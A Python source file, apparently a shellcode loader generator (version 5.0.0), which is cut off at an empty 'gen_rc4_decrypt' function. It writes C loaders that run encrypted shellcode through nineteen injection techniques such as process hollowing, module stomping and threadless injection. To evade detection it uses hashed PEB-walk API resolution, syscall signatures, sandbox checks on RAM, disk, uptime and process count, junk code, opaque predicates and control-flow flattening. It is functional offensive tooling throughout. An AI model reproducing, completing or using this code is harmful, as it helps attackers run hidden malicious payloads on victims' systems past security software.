import os
import sys
import argparse
import secrets
import random
import string
import hashlib

VERSION = "5.0.0"

TECHNIQUES = ["local", "inject", "apc", "callback", "fiber", "hijack", "stomp", "hollow", "pool", "phantom", "earlybird", "mapview", "tls", "transact", "threadless", "overload", "callbackfonts", "callbackdesktop", "callbackwindows"]

SYSCALL_APIS = [
    ('NtAllocateVirtualMemory', 'NTSTATUS', 'HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG'),
    ('NtProtectVirtualMemory',  'NTSTATUS', 'HANDLE,PVOID*,PSIZE_T,ULONG,PULONG'),
    ('NtWriteVirtualMemory',    'NTSTATUS', 'HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T'),
    ('NtCreateThreadEx',        'NTSTATUS', 'PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID'),
    ('NtOpenProcess',           'NTSTATUS', 'PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PCLIENT_ID'),
    ('NtClose',                 'NTSTATUS', 'HANDLE'),
    ('NtQueueApcThread',        'NTSTATUS', 'HANDLE,PVOID,PVOID,PVOID,PVOID'),
    ('NtResumeThread',          'NTSTATUS', 'HANDLE,PULONG'),
    ('NtReadVirtualMemory',     'NTSTATUS', 'HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T'),
    ('NtMapViewOfSection',      'NTSTATUS', 'HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG'),
]

LOCAL_TECHNIQUES = ("local", "stomp", "pool", "phantom", "mapview", "tls", "transact", "overload", "callbackfonts", "callbackdesktop", "callbackwindows")
MAX_SHELLCODE_SIZE = 10 * 1024 * 1024
STAGING_MAX_SIZE = 10 * 1024 * 1024

MIN_PROCESS_COUNT = 40
MIN_RAM_BYTES = 2147483648
MIN_DISK_BYTES = 53687091200
MIN_SCREEN_W = 800
MIN_SCREEN_H = 600
MIN_UPTIME_MS = 600000

TECHNIQUE_INFO = {
    'local':    {'local': True,  'needs_pid': False, 'needs_path': False},
    'inject':   {'local': False, 'needs_pid': True,  'needs_path': False},
    'apc':      {'local': False, 'needs_pid': False, 'needs_path': True},
    'callback': {'local': True,  'needs_pid': False, 'needs_path': False},
    'fiber':    {'local': True,  'needs_pid': False, 'needs_path': False},
    'hijack':   {'local': False, 'needs_pid': True,  'needs_path': False},
    'stomp':    {'local': True,  'needs_pid': False, 'needs_path': False},
    'hollow':   {'local': False, 'needs_pid': False, 'needs_path': True},
    'pool':     {'local': True,  'needs_pid': False, 'needs_path': False},
    'phantom':  {'local': True,  'needs_pid': False, 'needs_path': False},
    'earlybird':{'local': False, 'needs_pid': False, 'needs_path': False},
    'mapview':  {'local': True,  'needs_pid': False, 'needs_path': False},
    'tls':      {'local': True,  'needs_pid': False, 'needs_path': False},
    'transact': {'local': True,  'needs_pid': False, 'needs_path': False},
    'threadless':{'local': False, 'needs_pid': True, 'needs_path': False},
    'overload': {'local': True,  'needs_pid': False, 'needs_path': False},
    'callbackfonts':   {'local': True, 'needs_pid': False, 'needs_path': False},
    'callbackdesktop': {'local': True, 'needs_pid': False, 'needs_path': False},
    'callbackwindows': {'local': True, 'needs_pid': False, 'needs_path': False},
}

TECHNIQUE_DESC = {
    'local':    'alloc + exec in current process',
    'inject':   'remote thread injection',
    'apc':      'queue APC to suspended process',
    'callback': 'EnumChildWindows callback',
    'fiber':    'fiber-based exec',
    'hijack':   'thread context hijack (RIP redirect)',
    'stomp':    'module stomping (.text overwrite)',
    'hollow':   'process hollowing',
    'pool':     'thread pool callback',
    'phantom':  'double-mapped pagefile section',
    'earlybird':'early bird APC injection',
    'mapview':  'file mapping exec',
    'tls':      'TLS callback exec',
    'transact': 'transacted hollowing (NTFS txn)',
    'threadless':'threadless injection (export hook)',
    'overload': 'module overloading',
    'callbackfonts':   'EnumFontsW callback',
    'callbackdesktop': 'EnumDesktopWindows callback',
    'callbackwindows': 'EnumWindows callback',
}

_hash_seed: int = 5381

def rand_id(n=10):
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choices(string.ascii_lowercase + string.digits, k=n - 1))

def djb2_hash(s):
    h = _hash_seed
    for c in s.lower():
        h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
    return h

def xor_bytes(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def rc4_crypt(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def pad16(data):
    n = 16 - (len(data) % 16)
    return data + bytes([n] * n)

def aes_encrypt(data, key, iv):
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] pycryptodome required for AES encryption")
        print("    Install: pip install pycryptodome")
        sys.exit(1)
    return AES.new(key, AES.MODE_CBC, iv).encrypt(pad16(data))

def to_c_array(data, name):
    lines = ["unsigned char %s[] = {" % name]
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        vals = ", ".join("0x%02x" % b for b in chunk)
        lines.append("    %s," % vals)
    lines.append("};")
    lines.append("unsigned int %s_len = %d;" % (name, len(data)))
    return "\n".join(lines)

def tpl(template, **kw):
    for k, v in kw.items():
        template = template.replace("@@%s@@" % k, str(v))
    return template

def c_stack_string(s, var):
    xk = random.randint(1, 254)
    lines = ["    char %s[%d];" % (var, len(s) + 1)]
    for i, c in enumerate(s):
        lines.append("    %s[%d] = (char)(%d ^ %d);" % (var, i, ord(c) ^ xk, xk))
    lines.append("    %s[%d] = 0;" % (var, len(s)))
    return "\n".join(lines)

def gen_decoy_globals():
    parts = []
    for _ in range(random.randint(3, 6)):
        kind = random.randint(0, 4)
        v = rand_id(8)
        if kind == 0:
            parts.append("static volatile DWORD %s = 0x%08x;" % (v, random.randint(0, 0xFFFFFFFF)))
        elif kind == 1:
            sz = random.randint(8, 32)
            arr = ", ".join("0x%02x" % random.randint(0, 255) for _ in range(sz))
            parts.append("static unsigned char %s[] = {%s};" % (v, arr))
        elif kind == 2:
            parts.append("static const char %s[] = \"%s\";" % (v, rand_id(random.randint(8, 24))))
        elif kind == 3:
            parts.append("static volatile int %s = %d;" % (v, random.randint(-9999, 9999)))
        else:
            parts.append("static void* %s = NULL;" % v)
    return "\n".join(parts)

def gen_decoy_function():
    fn = rand_id(8)
    v1 = rand_id(6)
    v2 = rand_id(6)
    kind = random.randint(0, 3)
    if kind == 0:
        return "static int __attribute__((used)) %s(int %s) {\n    volatile int %s = %s * 0x%x;\n    return %s ^ %s;\n}" % (
            fn, v1, v2, v1, random.randint(0x100, 0xFFFF), v2, v1)
    elif kind == 1:
        return "static void __attribute__((used)) %s(unsigned char* %s, int %s) {\n    for (int i = 0; i < %s; i++) %s[i] ^= (unsigned char)(i + %d);\n}" % (
            fn, v1, v2, v2, v1, random.randint(1, 255))
    elif kind == 2:
        return "static DWORD __attribute__((used)) %s(const char* %s) {\n    DWORD %s = 0x%08x;\n    while (*%s) { %s = ((%s << 5) + %s) + (unsigned char)*%s; %s++; }\n    return %s;\n}" % (
            fn, v1, v2, random.randint(0x1000, 0xFFFFFFFF), v1, v2, v2, v2, v1, v1, v2)
    else:
        return "static int __attribute__((used)) %s(int %s, int %s) {\n    return (%s ^ %s) + ((%s & 0xFF) << 8);\n}" % (
            fn, v1, v2, v1, v2, v1)

def gen_opaque_true():
    v = rand_id(5)
    n = random.randint(2, 200)
    a = random.randint(1, 0xFF)
    b = random.randint(0x100, 0xFFFF)
    patterns = [
        "((volatile int)%d * (volatile int)%d >= 0 || (volatile int)%d * (volatile int)%d <= 0)" % (n, n, n, n),
        "((volatile int)(%d | 1) != 0)" % random.randint(1, 0xFFFF),
        "((volatile int)((%d ^ %d) | %d) != 0)" % (a, b, a),
        "((volatile unsigned)%d + 1u > 0u)" % random.randint(0, 0xFFFFFFFE),
        "((volatile int)%d %% 2 == 0 || (volatile int)%d %% 2 != 0)" % (n, n),
        "((volatile unsigned)(%d * %d) <= (volatile unsigned)(%d * %d))" % (n, n, n, n),
        "((volatile int)(~%d) != %d)" % (n, n),
        "((volatile unsigned)(%du ^ %du) == %du)" % (a, a, 0),
        "((volatile int)(%d >> 1) >= 0)" % random.randint(0, 0x7FFFFFFF),
        "((volatile int)sizeof(void*) > 0)",
    ]
    return random.choice(patterns)

def gen_opaque_false():
    n = random.randint(2, 200)
    a = random.randint(1, 0xFF)
    patterns = [
        "((volatile int)%d > %d && (volatile int)%d < %d)" % (n, n + 100, n, n - 100),
        "((volatile unsigned)0xFFFFFFFF + 2u == 0u)",
        "((volatile int)(%d & 0) != 0)" % random.randint(1, 0xFFFF),
        "((volatile int)sizeof(void*) > 64)",
        "((volatile int)(%d ^ %d) == 1 && (volatile int)(%d ^ %d) == 2)" % (a, a, a, a),
        "((volatile unsigned)%du > 0xFFFFFFFFu)" % random.randint(1, 0xFFFF),
        "((volatile int)0 && (volatile int)%d)" % random.randint(1, 0xFFFF),
    ]
    return random.choice(patterns)

def gen_cff_dispatch(call_blocks):
    if len(call_blocks) < 2:
        return "".join(call_blocks)
    sv = rand_id(5)
    states = random.sample(range(100, 9999), len(call_blocks) + 1)
    end_state = states[-1]
    cases = []
    for i, blk in enumerate(call_blocks):
        nxt = states[i + 1] if i + 1 < len(call_blocks) else end_state
        cases.append("        case %d: { %s %s = %d; break; }" % (states[i], blk.strip(), sv, nxt))
    random.shuffle(cases)
    lines = []
    lines.append("    volatile int %s = %d;" % (sv, states[0]))
    lines.append("    while (%s != %d) {" % (sv, end_state))
    lines.append("      switch (%s) {" % sv)
    lines.extend(cases)
    lines.append("        default: %s = %d; break;" % (sv, end_state))
    lines.append("      }")
    lines.append("    }")
    return "\n".join(lines) + "\n"

def gen_junk_block():
    v1 = rand_id(6)
    choice = random.randint(0, 17)
    if choice == 0:
        return "    volatile int %s = %d; %s ^= %s; %s += %d; (void)%s;" % (
            v1, random.randint(1, 9999), v1, v1, v1, random.randint(1, 9999), v1)
    elif choice == 1:
        return "    if (%s) { volatile int %s = %d; (void)%s; }" % (
            gen_opaque_false(), v1, random.randint(1, 9999), v1)
    elif choice == 2:
        v2 = rand_id(6)
        return "    for (volatile int %s = 0; %s < %d; %s++) { volatile int %s = %s * 3; (void)%s; }" % (
            v1, v1, random.randint(2, 8), v1, v2, v1, v2)
    elif choice == 3:
        return "    volatile DWORD %s = %d; %s = (%s >> %d) | (%s << %d); (void)%s;" % (
            v1, random.randint(0x1000, 0xFFFF), v1, v1, random.randint(1, 15), v1, random.randint(1, 15), v1)
    elif choice == 4:
        return "    volatile int %s = %d; %s *= 3; %s ^= 0x%x; (void)%s;" % (
            v1, random.randint(1, 9999), v1, v1, random.randint(0x100, 0xFFFF), v1)
    elif choice == 5:
        v2 = rand_id(6)
        return "    if (%s) { volatile int %s = %d; %s ^= 0x%x; (void)%s; }" % (
            gen_opaque_true(), v2, random.randint(1, 0xFFFF), v2, random.randint(0x100, 0xFFFF), v2)
    elif choice == 6:
        v2 = rand_id(6)
        return "    volatile int %s = %d; if (%s) { %s += %d; } (void)%s;" % (
            v2, random.randint(1, 9999), gen_opaque_false(), v2, random.randint(1, 9999), v2)
    elif choice == 7:
        v2 = rand_id(6)
        v3 = rand_id(6)
        return "    volatile int %s = %d, %s = %d; if (%s) { %s = %s ^ %s; } (void)%s; (void)%s;" % (
            v2, random.randint(1, 9999), v3, random.randint(1, 9999), gen_opaque_true(), v2, v2, v3, v2, v3)
    elif choice == 8:
        v2 = rand_id(6)
        return "    volatile int %s = %d; while (%s) { %s++; break; } (void)%s;" % (
            v2, random.randint(1, 9999), gen_opaque_true(), v2, v2)
    elif choice == 9:
        return "    { volatile DWORD %s = GetLastError(); SetLastError(%s); (void)%s; }" % (v1, v1, v1)
    elif choice == 10:
        return "    { volatile DWORD %s = GetCurrentProcessId(); %s ^= %s; (void)%s; }" % (
            v1, v1, v1, v1)
    elif choice == 11:
        v2 = rand_id(6)
        return "    { volatile HANDLE %s = GetProcessHeap(); volatile LPVOID %s = HeapAlloc(%s, 0, %d); if (%s) HeapFree(%s, 0, %s); }" % (
            v1, v2, v1, random.randint(16, 4096), v2, v1, v2)
    elif choice == 12:
        v2 = rand_id(6)
        v3 = rand_id(6)
        return "    volatile unsigned char %s[%d]; for (int %s = 0; %s < %d; %s++) %s[%s] = (unsigned char)(%s ^ %d); (void)%s[0];" % (
            v1, random.randint(4, 32), v2, v2, random.randint(4, 32), v2, v1, v2, v2, random.randint(1, 255), v1)
    elif choice == 13:
        v2 = rand_id(6)
        v3 = rand_id(6)
        return "    { struct { volatile int %s; volatile int %s; } %s = {%d, %d}; %s.%s ^= %s.%s; (void)%s.%s; }" % (
            v2, v3, v1, random.randint(1, 9999), random.randint(1, 9999), v1, v2, v1, v3, v1, v2)
    elif choice == 14:
        v2 = rand_id(6)
        return "    switch ((volatile int)%d) { case %d: { volatile int %s = %d; (void)%s; break; } default: break; }" % (
            random.randint(1, 10), random.randint(1, 10), v2, random.randint(1, 9999), v2)
    elif choice == 15:
        v2 = rand_id(6)
        v3 = rand_id(6)
        return "    volatile int %s = %d, %s = %d; for (int %s = 0; %s < 3; %s++) { %s = (%s + %s) ^ %d; } (void)%s;" % (
            v1, random.randint(1, 9999), v2, random.randint(1, 9999), v3, v3, v3, v1, v1, v2, random.randint(1, 0xFF), v1)
    elif choice == 16:
        return "    { volatile ULONGLONG %s = GetTickCount64(); %s += %d; (void)%s; }" % (
            v1, v1, random.randint(1, 9999), v1)
    else:
        v2 = rand_id(6)
        v3 = rand_id(6)
        return "    { volatile int %s[4] = {%d,%d,%d,%d}; volatile int %s = 0; for (int %s = 0; %s < 4; %s++) %s += %s[%s]; (void)%s; }" % (
            v1, random.randint(1, 255), random.randint(1, 255), random.randint(1, 255), random.randint(1, 255),
            v2, v3, v3, v3, v2, v1, v3, v2)

API_INFO = {
    'VirtualAlloc':             ('kernel32.dll', 'LPVOID', 'LPVOID,SIZE_T,DWORD,DWORD'),
    'VirtualProtect':           ('kernel32.dll', 'BOOL',   'LPVOID,SIZE_T,DWORD,PDWORD'),
    'CreateThread':             ('kernel32.dll', 'HANDLE', 'LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD'),
    'OpenProcess':              ('kernel32.dll', 'HANDLE', 'DWORD,BOOL,DWORD'),
    'VirtualAllocEx':           ('kernel32.dll', 'LPVOID', 'HANDLE,LPVOID,SIZE_T,DWORD,DWORD'),
    'WriteProcessMemory':       ('kernel32.dll', 'BOOL',   'HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*'),
    'ReadProcessMemory':        ('kernel32.dll', 'BOOL',   'HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*'),
    'VirtualProtectEx':         ('kernel32.dll', 'BOOL',   'HANDLE,LPVOID,SIZE_T,DWORD,PDWORD'),
    'CreateRemoteThread':       ('kernel32.dll', 'HANDLE', 'HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD'),
    'QueueUserAPC':             ('kernel32.dll', 'DWORD',  'PAPCFUNC,HANDLE,ULONG_PTR'),
    'CreateProcessA':           ('kernel32.dll', 'BOOL',   'LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION'),
    'ResumeThread':             ('kernel32.dll', 'DWORD',  'HANDLE'),
    'OpenThread':               ('kernel32.dll', 'HANDLE', 'DWORD,BOOL,DWORD'),
    'SuspendThread':            ('kernel32.dll', 'DWORD',  'HANDLE'),
    'GetThreadContext':         ('kernel32.dll', 'BOOL',   'HANDLE,LPCONTEXT'),
    'SetThreadContext':         ('kernel32.dll', 'BOOL',   'HANDLE,const CONTEXT*'),
    'LoadLibraryExA':           ('kernel32.dll', 'HMODULE','LPCSTR,HANDLE,DWORD'),
    'LoadLibraryA':             ('kernel32.dll', 'HMODULE','LPCSTR'),
    'GetModuleHandleA':         ('kernel32.dll', 'HMODULE','LPCSTR'),
    'ConvertThreadToFiber':     ('kernel32.dll', 'LPVOID', 'LPVOID'),
    'CreateFiber':              ('kernel32.dll', 'LPVOID', 'SIZE_T,LPFIBER_START_ROUTINE,LPVOID'),
    'SwitchToFiber':            ('kernel32.dll', 'void',   'LPVOID'),
    'EnumChildWindows':         ('user32.dll',   'BOOL',   'HWND,WNDENUMPROC,LPARAM'),
    'GetModuleFileNameA':       ('kernel32.dll', 'DWORD',  'HMODULE,LPSTR,DWORD'),
    'CreateFileA':              ('kernel32.dll', 'HANDLE', 'LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE'),
    'SetFileInformationByHandle': ('kernel32.dll', 'BOOL', 'HANDLE,int,LPVOID,DWORD'),
    'GetComputerNameA':         ('kernel32.dll', 'BOOL',   'LPSTR,LPDWORD'),
    'InternetOpenA':            ('wininet.dll',  'void*',  'const char*,DWORD,const char*,const char*,DWORD'),
    'InternetOpenUrlA':         ('wininet.dll',  'void*',  'void*,const char*,const char*,DWORD,DWORD,DWORD_PTR'),
    'InternetReadFile':         ('wininet.dll',  'BOOL',   'void*,void*,DWORD,DWORD*'),
    'InternetCloseHandle':      ('wininet.dll',  'BOOL',   'void*'),
    'CloseHandle':              ('kernel32.dll', 'BOOL',   'HANDLE'),
    'CreateToolhelp32Snapshot': ('kernel32.dll', 'HANDLE', 'DWORD,DWORD'),
    'Process32First':           ('kernel32.dll', 'BOOL',   'HANDLE,void*'),
    'Process32Next':            ('kernel32.dll', 'BOOL',   'HANDLE,void*'),
    'Thread32First':            ('kernel32.dll', 'BOOL',   'HANDLE,void*'),
    'Thread32Next':             ('kernel32.dll', 'BOOL',   'HANDLE,void*'),
    'GetTickCount64':           ('kernel32.dll', 'ULONGLONG', 'void'),
    'GlobalMemoryStatusEx':     ('kernel32.dll', 'BOOL',   'void*'),
    'GetSystemInfo':            ('kernel32.dll', 'void',   'void*'),
    'GetDiskFreeSpaceExA':      ('kernel32.dll', 'BOOL',   'LPCSTR,void*,void*,void*'),
    'GetSystemMetrics':         ('user32.dll',   'int',    'int'),
    'GetComputerNameExW':       ('kernel32.dll', 'BOOL',   'int,LPWSTR,LPDWORD'),
    'CreateEventW':             ('kernel32.dll', 'HANDLE', 'void*,BOOL,BOOL,void*'),
    'WaitForSingleObject':      ('kernel32.dll', 'DWORD',  'HANDLE,DWORD'),
    'CreateTimerQueue':         ('kernel32.dll', 'HANDLE', 'void'),
    'CreateTimerQueueTimer':    ('kernel32.dll', 'BOOL',   'void*,HANDLE,void*,void*,DWORD,DWORD,ULONG'),
    'DeleteTimerQueueEx':       ('kernel32.dll', 'BOOL',   'HANDLE,HANDLE'),
    'SetEvent':                 ('kernel32.dll', 'BOOL',   'HANDLE'),
    'CreateFileMappingA':       ('kernel32.dll', 'HANDLE', 'HANDLE,void*,DWORD,DWORD,DWORD,LPCSTR'),
    'MapViewOfFile':            ('kernel32.dll', 'void*',  'HANDLE,DWORD,DWORD,DWORD,SIZE_T'),
    'UnmapViewOfFile':          ('kernel32.dll', 'BOOL',   'void*'),
    'GetSystemDirectoryA':      ('kernel32.dll', 'UINT',   'LPSTR,UINT'),
    'QueryPerformanceCounter':  ('kernel32.dll', 'BOOL',   'LARGE_INTEGER*'),
    'GetLocalTime':             ('kernel32.dll', 'void',   'void*'),
    'DisableThreadLibraryCalls': ('kernel32.dll', 'BOOL',  'HMODULE'),
    'CreateThreadpoolWork':      ('kernel32.dll', 'void*', 'void*,void*,void*'),
    'SubmitThreadpoolWork':      ('kernel32.dll', 'void',  'void*'),
    'WaitForThreadpoolWorkCallbacks': ('kernel32.dll', 'void', 'void*,BOOL'),
    'CloseThreadpoolWork':       ('kernel32.dll', 'void',  'void*'),
    'SetProcessValidCallTargets': ('kernel32.dll', 'BOOL', 'HANDLE,PVOID,SIZE_T,ULONG,void*'),
    'TerminateProcess':          ('kernel32.dll', 'BOOL', 'HANDLE,UINT'),
    'GetCurrentThreadId':        ('kernel32.dll', 'DWORD', 'void'),
    'RegOpenKeyExA':             ('advapi32.dll', 'LONG', 'HKEY,LPCSTR,DWORD,DWORD,void*'),
    'RegQueryValueExA':          ('advapi32.dll', 'LONG', 'HKEY,LPCSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD'),
    'RegCloseKey':               ('advapi32.dll', 'LONG', 'HKEY'),
    'GetCursorPos':              ('user32.dll', 'BOOL', 'void*'),
    'GetUserNameA':              ('advapi32.dll', 'BOOL', 'LPSTR,LPDWORD'),
    'FindFirstFileA':            ('kernel32.dll', 'HANDLE', 'LPCSTR,void*'),
    'FindClose':                 ('kernel32.dll', 'BOOL', 'HANDLE'),
    'GetAdaptersInfo':           ('iphlpapi.dll', 'DWORD', 'void*,PULONG'),
    'CreateFileTransactedA':     ('kernel32.dll', 'HANDLE', 'LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE,HANDLE,void*,void*'),
    'WriteFile':                 ('kernel32.dll', 'BOOL',   'HANDLE,LPCVOID,DWORD,LPDWORD,void*'),
    'GetTempPathA':              ('kernel32.dll', 'DWORD',  'DWORD,LPSTR'),
    'DeleteFileA':               ('kernel32.dll', 'BOOL',   'LPCSTR'),
    'EnumFontsW':                ('gdi32.dll',    'int',    'HDC,LPCWSTR,void*,LPARAM'),
    'EnumDesktopWindows':        ('user32.dll',   'BOOL',   'void*,void*,LPARAM'),
    'EnumWindows':               ('user32.dll',   'BOOL',   'void*,LPARAM'),
    'GetDC':                     ('user32.dll',   'HDC',    'HWND'),
    'ReleaseDC':                 ('user32.dll',   'int',    'HWND,HDC'),
    'GetProcessHeap':            ('kernel32.dll', 'HANDLE', 'void'),
    'HeapAlloc':                 ('kernel32.dll', 'LPVOID', 'HANDLE,DWORD,SIZE_T'),
    'HeapFree':                  ('kernel32.dll', 'BOOL',   'HANDLE,DWORD,LPVOID'),
    'GetProcAddress':            ('kernel32.dll', 'void*',  'HMODULE,LPCSTR'),
    'VirtualQuery':              ('kernel32.dll', 'SIZE_T', 'LPCVOID,void*,SIZE_T'),
}

def gen_resolve_api_fn():
    hv = {k: rand_id() for k in ['fn', 's', 'h', 'c']}
    hash_code = tpl("""static unsigned int @@fn@@(const char* @@s@@) {
    unsigned int @@h@@ = @@seed@@u;
    while (*@@s@@) {
        char @@c@@ = *@@s@@;
        if (@@c@@ >= 65 && @@c@@ <= 90) @@c@@ += 32;
        @@h@@ = ((@@h@@ << 5) + @@h@@) + (unsigned char)@@c@@;
        @@s@@++;
    }
    return @@h@@;
}""", seed=_hash_seed, **hv)

    v = {k: rand_id() for k in ['fn', 'mh', 'fh', 'peb', 'ldr', 'head', 'cur',
                                  'base', 'dh', 'nh', 'ed', 'exd', 'names', 'ords', 'funcs',
                                  'wn', 'wl', 'nb', 'j', 'fi']}

    peb_code = tpl("""static void* @@fn@@(unsigned int @@mh@@, unsigned int @@fh@@) {
#ifdef _MSC_VER
    unsigned char* @@peb@@ = (unsigned char*)__readgsqword(0x60);
#else
    unsigned char* @@peb@@;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(@@peb@@));
#endif
    unsigned char* @@ldr@@ = *(unsigned char**)(@@peb@@ + 0x18);
    unsigned char* @@head@@ = @@ldr@@ + 0x20;
    unsigned char* @@cur@@ = *(unsigned char**)(@@head@@);
    while (@@cur@@ != @@head@@) {
        unsigned char* @@base@@ = *(unsigned char**)(@@cur@@ + 0x20);
        if (@@base@@) {
            unsigned short* @@wn@@ = *(unsigned short**)(@@cur@@ + 0x50);
            int @@wl@@ = *(unsigned short*)(@@cur@@ + 0x48) / 2;
            char @@nb@@[256];
            for (int @@j@@ = 0; @@j@@ < @@wl@@ && @@j@@ < 255; @@j@@++) @@nb@@[@@j@@] = (char)@@wn@@[@@j@@];
            @@nb@@[@@wl@@ < 255 ? @@wl@@ : 255] = 0;
            if (@@hfn@@(@@nb@@) == @@mh@@) {
                if (@@fh@@ == 0) return (void*)@@base@@;
                PIMAGE_DOS_HEADER @@dh@@ = (PIMAGE_DOS_HEADER)@@base@@;
                PIMAGE_NT_HEADERS @@nh@@ = (PIMAGE_NT_HEADERS)(@@base@@ + @@dh@@->e_lfanew);
                IMAGE_DATA_DIRECTORY* @@ed@@ = &@@nh@@->OptionalHeader.DataDirectory[0];
                if (@@ed@@->Size) {
                    IMAGE_EXPORT_DIRECTORY* @@exd@@ = (IMAGE_EXPORT_DIRECTORY*)(@@base@@ + @@ed@@->VirtualAddress);
                    DWORD* @@names@@ = (DWORD*)(@@base@@ + @@exd@@->AddressOfNames);
                    WORD* @@ords@@ = (WORD*)(@@base@@ + @@exd@@->AddressOfNameOrdinals);
                    DWORD* @@funcs@@ = (DWORD*)(@@base@@ + @@exd@@->AddressOfFunctions);
                    for (DWORD @@fi@@ = 0; @@fi@@ < @@exd@@->NumberOfNames; @@fi@@++) {
                        if (@@hfn@@((char*)(@@base@@ + @@names@@[@@fi@@])) == @@fh@@)
                            return (void*)(@@base@@ + @@funcs@@[@@ords@@[@@fi@@]]);
                    }
                }
            }
        }
        @@cur@@ = *(unsigned char**)(@@cur@@);
    }
    return NULL;
}""", hfn=hv['fn'], **v)

    return v['fn'], hv['fn'], hash_code + "\n\n" + peb_code

def gen_resolve_one(resolve_fn, api_name):
    dll, ret, params = API_INFO[api_name]
    mod_hash = djb2_hash(dll)
    func_hash = djb2_hash(api_name)
    td = rand_id(8)
    ptr = rand_id(8)
    code = "    typedef %s (WINAPI* %s)(%s);\n" % (ret, td, params)
    code += "    %s %s = (%s)%s(0x%08xu, 0x%08xu);" % (td, ptr, td, resolve_fn, mod_hash, func_hash)
    return ptr, code

def gen_resolve_raw(resolve_fn, dll_name, func_name):
    mod_hash = djb2_hash(dll_name)
    func_hash = djb2_hash(func_name)
    ptr = rand_id(8)
    code = "    unsigned char* %s = (unsigned char*)%s(0x%08xu, 0x%08xu);" % (ptr, resolve_fn, mod_hash, func_hash)
    return ptr, code

def gen_resolve(resolve_fn, api_name, syscall_map=None):
    if syscall_map and api_name in syscall_map:
        return syscall_map[api_name], ""
    return gen_resolve_one(resolve_fn, api_name)

def _multi_resolve(resolve_fn, api_names, syscall_map=None):
    ptrs = {}
    codes = []
    for name in api_names:
        ptr, code = gen_resolve(resolve_fn, name, syscall_map)
        ptrs[name] = ptr
        if code:
            codes.append(code)
    return ptrs, codes

def gen_xor_decrypt():
    v = {k: rand_id() for k in ['fn', 'b', 'bl', 'k', 'kl', 'i']}
    code = tpl("""void @@fn@@(unsigned char* @@b@@, unsigned int @@bl@@, unsigned char* @@k@@, unsigned int @@kl@@) {
    for (unsigned int @@i@@ = 0; @@i@@ < @@bl@@; @@i@@++) {
        @@b@@[@@i@@] ^= @@k@@[@@i@@ % @@kl@@];
    }
}""", **v)
    return v['fn'], code

def gen_aes_decrypt():
    v = {k: rand_id() for k in ['fn', 'ct', 'cl', 'ky', 'iv', 'ol', 'ha', 'hk', 'rl', 'pt', 'ia', 'ib', 'st']}
    code = tpl("""unsigned char* @@fn@@(unsigned char* @@ct@@, unsigned int @@cl@@, unsigned char* @@ky@@, unsigned char* @@iv@@, unsigned int* @@ol@@) {
    BCRYPT_ALG_HANDLE @@ha@@ = NULL;
    BCRYPT_KEY_HANDLE @@hk@@ = NULL;
    ULONG @@rl@@ = 0;
    NTSTATUS @@st@@;
    unsigned char @@ia@@[16], @@ib@@[16];
    memcpy(@@ia@@, @@iv@@, 16);
    memcpy(@@ib@@, @@iv@@, 16);
    @@st@@ = BCryptOpenAlgorithmProvider(&@@ha@@, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (@@st@@ != 0) return NULL;
    @@st@@ = BCryptSetProperty(@@ha@@, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (@@st@@ != 0) { BCryptCloseAlgorithmProvider(@@ha@@, 0); return NULL; }
    @@st@@ = BCryptGenerateSymmetricKey(@@ha@@, &@@hk@@, NULL, 0, @@ky@@, 32, 0);
    if (@@st@@ != 0) { BCryptCloseAlgorithmProvider(@@ha@@, 0); return NULL; }
    @@st@@ = BCryptDecrypt(@@hk@@, @@ct@@, @@cl@@, NULL, @@ia@@, 16, NULL, 0, &@@rl@@, BCRYPT_BLOCK_PADDING);
    if (@@st@@ != 0) { BCryptDestroyKey(@@hk@@); BCryptCloseAlgorithmProvider(@@ha@@, 0); return NULL; }
    unsigned char* @@pt@@ = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, @@rl@@);
    if (!@@pt@@) { BCryptDestroyKey(@@hk@@); BCryptCloseAlgorithmProvider(@@ha@@, 0); return NULL; }
    @@st@@ = BCryptDecrypt(@@hk@@, @@ct@@, @@cl@@, NULL, @@ib@@, 16, @@pt@@, @@rl@@, &@@rl@@, BCRYPT_BLOCK_PADDING);
    if (@@st@@ != 0) { HeapFree(GetProcessHeap(), 0, @@pt@@); BCryptDestroyKey(@@hk@@); BCryptCloseAlgorithmProvider(@@ha@@, 0); return NULL; }
    *@@ol@@ = @@rl@@;
    BCryptDestroyKey(@@hk@@);
    BCryptCloseAlgorithmProvider(@@ha@@, 0);
    return @@pt@@;
}""", **v)
    return v['fn'], code

def gen_rc4_decrypt():
